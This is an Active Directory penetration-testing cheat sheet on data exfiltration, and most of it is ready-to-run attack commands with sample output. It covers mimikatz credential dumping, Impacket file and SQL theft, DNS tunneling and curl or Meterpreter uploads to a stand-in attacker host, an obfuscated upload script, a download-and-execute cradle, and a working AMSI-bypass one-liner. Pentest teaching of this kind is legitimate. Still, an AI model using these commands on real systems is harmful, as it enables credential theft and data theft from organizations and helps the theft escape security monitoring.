# Data Exfiltration in Active Directory Penetration Testing

## Overview
Data exfiltration involves extracting sensitive data from the AD environment, such as credentials, files, or database contents, to demonstrate the impact of a breach.

## Detailed Methods and Techniques
- **Credential Dumping**:
  - **Technique**: Dump password hashes from a domain controller’s memory.
  - **Execution**: Use `mimikatz` for LSASS memory dump.
    ```bash
    mimikatz # sekurlsa::logonpasswords
    ```
    **Example Output**:
    ```
    Username: Administrator
    Domain: EXAMPLE.COM
    NTLM: aad3b435b51404eeaad3b435b51404ee
    ```
    - **Purpose**: Obtain credentials for further attacks or proof of compromise.
- **File Exfiltration**:
  - **Technique**: Copy sensitive files from SMB shares or user directories.
  - **Execution**: Use `smbclient.py` from Impacket.
    ```bash
    smbclient.py example.com/jdoe:P@ssw0rd123@192.168.1.20 -c "get sensitive.docx"
    ```
    **Example Output**:
    ```
    getting file \shared_folder\sensitive.docx
    ```
    - **Purpose**: Extract sensitive documents to demonstrate data loss.
- **Database Dumping**:
  - **Technique**: Extract data from an AD-integrated SQL server.
  - **Execution**: Use `mssqlclient.py` from Impacket.
    ```bash
    mssqlclient.py example.com/jdoe:P@ssw0rd123@192.168.1.30 -windows-auth
    SQL> SELECT * FROM sensitive_data;
    ```
    **Example Output**:
    ```
    id  | name        | ssn
    1   | John Doe    | 123-45-6789
    2   | Jane Smith  | 987-65-4321
    ```
    - **Purpose**: Demonstrate exposure of critical data.
- **DNS Tunneling**:
  - **Technique**: Exfiltrate data via DNS queries to bypass network monitoring.
  - **Execution**: Use `dnscat2`.
    ```bash
    dnscat2-client --dns server=attacker.com
    ```
    **Example Output**:
    ```
    [*] Data sent via DNS to attacker.com
    ```
    - **Purpose**: Covertly exfiltrate data past firewalls.
- **HTTP/HTTPS Exfiltration**:
  - **Technique**: Upload data to a remote server via HTTP/HTTPS.
  - **Execution**: Use `curl`.
    ```bash
    curl -F "file=@sensitive.docx" http://attacker.com/upload
    ```
    **Example Output**:
    ```
    Upload successful
    ```
    - **Purpose**: Transfer data to an attacker-controlled server.

## Exploitation Methods
- **Data Transfer via C2**:
  - **Technique**: Use a command-and-control (C2) framework to exfiltrate data.
  - **Execution**: Use Metasploit’s Meterpreter.
    ```bash
    meterpreter > upload sensitive.docx http://attacker.com
    ```
    **Example Output**:
    ```
    [*] uploading: sensitive.docx -> http://attacker.com
    ```
    - **Purpose**: Simulate real-world data theft.
- **Covert Exfiltration**:
  - **Technique**: Use steganography to hide data in images or other files.
  - **Execution**: Use `steghide`.
    ```bash
    steghide embed -cf image.jpg -ef sensitive.txt
    ```
    **Example Output**:
    ```
    embedding "sensitive.txt" in "image.jpg": done
    ```
    - **Purpose**: Exfiltrate data covertly via email or file uploads.

## AV/AMSI Evasion Techniques
- **Encrypted Exfiltration**:
  - **Technique**: Use HTTPS for data exfiltration.
  - **Execution**: Use `curl` with HTTPS.
    ```bash
    curl -F "file=@sensitive.docx" https://attacker.com/upload
    ```
    - **Purpose**: Evade network-based AV/EDR monitoring.
- **Obfuscated Payloads**:
  - **Technique**: Obfuscate exfiltration scripts.
  - **Execution**: Use `Invoke-Obfuscation`.
    ```powershell
    Invoke-Obfuscation -ScriptBlock {Invoke-WebRequest -Uri https://attacker.com/upload -Method Post -InFile sensitive.docx} -Technique Encode
    ```
    **Example Output**:
    ```
    $encoded = "JAB...=="
    Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($encoded)))
    ```
    - **Purpose**: Evade AMSI detection.
- **In-Memory Execution**:
  - **Technique**: Execute exfiltration scripts in memory.
  - **Execution**: Use `Invoke-Expression`.
    ```powershell
    IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/exfil.ps1')
    ```
    - **Purpose**: Avoid AV detection by not writing to disk.
- **AMSI Bypass**:
  - **Technique**: Disable AMSI for PowerShell-based exfiltration.
  - **Execution**:
    ```powershell
    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null, [IntPtr]::Zero)
    ```
    - **Purpose**: Prevent PowerShell script scanning.

## Tools
- **Mimikatz**: Credential dumping (`sekurlsa::logonpasswords`).
- **Impacket**: File and database access (`smbclient.py`, `mssqlclient.py`).
- **Metasploit**: C2 framework for data transfer (`meterpreter`).
- **dnscat2**: DNS tunneling for covert exfiltration.
- **steghide**: Steganography for covert exfiltration.
- **curl**: HTTP/HTTPS data transfer.

## Best Practices
- Ensure exfiltration tests are authorized and data is handled securely.
- Document all exfiltrated data types and methods for reporting.
- Delete exfiltrated data after testing to prevent leaks.
- Use encryption and obfuscation to evade AV/AMSI.